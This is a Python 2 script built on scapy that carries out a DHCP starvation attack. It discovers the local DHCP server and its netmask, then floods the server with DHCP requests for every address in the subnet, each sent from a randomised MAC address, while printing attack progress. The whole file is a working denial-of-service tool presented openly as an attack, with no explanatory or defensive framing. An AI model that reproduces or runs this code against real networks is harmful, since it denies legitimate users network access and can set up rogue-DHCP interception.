#!/usr/bin/env python

from scapy.all import *
from time import ctime,sleep
from threading import Thread,Lock
import IPy

flag = 0
dhcp_address = '0.0.0.0'
current_subnet = '0.0.0.0'

def getdhcpip():
    global flag
    print "[+] Geting The DHCP server IP Address!"
    while flag == 0:
        tap_interface = 'eth0'
        src_mac_address = RandMAC()
        ethernet = Ether(dst = 'ff:ff:ff:ff:ff:ff',src = src_mac_address,type=0x800)
        ip = IP(src ='0.0.0.0',dst='255.255.255.255')
        udp =UDP (sport=68,dport=67)
        fam,hw = get_if_raw_hwaddr(tap_interface)
        bootp = BOOTP(chaddr = hw, ciaddr = '0.0.0.0',xid =  0x01020304,flags= 1)
        dhcp = DHCP(options=[("message-type","discover"),"end"])
        packet = ethernet / ip / udp / bootp / dhcp
        sendp(packet,count=1,verbose=0)
        sleep(0.1)

def matchpacket():
    global flag
    global dhcp_address
    global current_subnet
    while flag == 0:
        try:
            a = sniff(filter='udp and dst 255.255.255.255',iface='eth0',count=2)
            current_subnet = a[1][1][3].options[1][1]
            dhcp_address = a[1][1][0].src
            if dhcp_address is not '0.0.0.0' and current_subnet is not '0.0.0.0':
                flag = 1
                print "[+] The DHCP SERVER IP ADDRESS IS "+dhcp_address + "\r\n"
                print "[+] CURRENT NETMASK IS " + current_subnet+"\r\n"

        except:
            pass
        time.sleep(0.1)

func = [getdhcpip,matchpacket]

def dhcp_attack():
    global dhcp_address
    address_info = IPy.IP(dhcp_address).make_net(current_subnet).strNormal() 
    address = address_info.split('/')[0]
    address = address.replace('.0','')
    netmask = address_info.split('/')[1]
    max_sub_number = 2**(32-int(netmask))-2
    bin_ip = address_info.split('/')[0].split('.')
    
    ip_info=''
    for i in range(0,4):
        string = str(bin(int(bin_ip[i]))).replace('0b','')
        if(len(string)!=8):
            for i in range(0,8-len(string)):
                string = "0"+string
        ip_info = ip_info + str(string)

    for i in range(1,max_sub_number+1):
        ip = str(bin(int(ip_info,2) + i))[2:]
        need_address = str(int(ip[0:8],2))+'.'+str(int(ip[8:16],2))+'.'+str(int(ip[16:24],2))+'.'+str(int(ip[24:32],2))
        rand_mac_address = RandMAC()
        dhcp_attack_packet = Ether(src=rand_mac_address,dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0',dst='255.255.255.255')/UDP(sport=68,dport=67)/BOOTP(chaddr=rand_mac_address)/DHCP(options=[("message-type",'request'),("server_id",dhcp_address),("requested_addr",need_address),"end"])
        sendp(dhcp_attack_packet,verbose=0)
        print "[+] USE IP: "+need_address +" Attacking "+dhcp_address +" Now!"
		
def main():
    threads= []
    for i in range(0,len(func)):   
        t1 = Thread(target=func[i])
        threads.append(t1)
    for t in threads:
        t.setDaemon(True)
        t.start()
    for t in threads:
        t.join()
    dhcp_attack()
    
if __name__ == '__main__':
    main()
    print "[+] Attack Over!"
